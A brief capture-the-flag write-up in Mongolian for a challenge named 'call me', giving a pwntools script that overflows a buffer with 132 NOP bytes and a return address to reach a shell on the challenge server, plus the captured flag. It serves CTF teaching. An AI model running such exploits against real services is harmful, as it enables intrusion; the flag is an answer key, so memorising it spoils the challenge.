## call me

`nc 218.100.84.106 9005` дээр хавсралт дээрх elf ажиллаж байгаа болно.

> **By reamb**

## Writeup

Энгийн **Buffer Overflow** ашиглан энэ даалгаварыг амархан биелүүлэх боломжтой.

```python
from pwn import *

# 218.100.84.106 9005
r = remote('218.100.84.106', 9005)

nop = shellcraft.i386.nop()
call_me_address = 0x8048d54

r.send((asm(nop) * 132) + p32(call_me_address))
r.interactive()
```

Дээрх скриптийг ажиллуулахад **command line shell** (Interactive mode буюу`/bin/bash`) рүү орно.
Эндээс `ls`, `cat` коммандуудыг ашиглан тугийг харах боломжтой.

```
Туг: HZ{ROP_ROP_ROP_ROP}
```
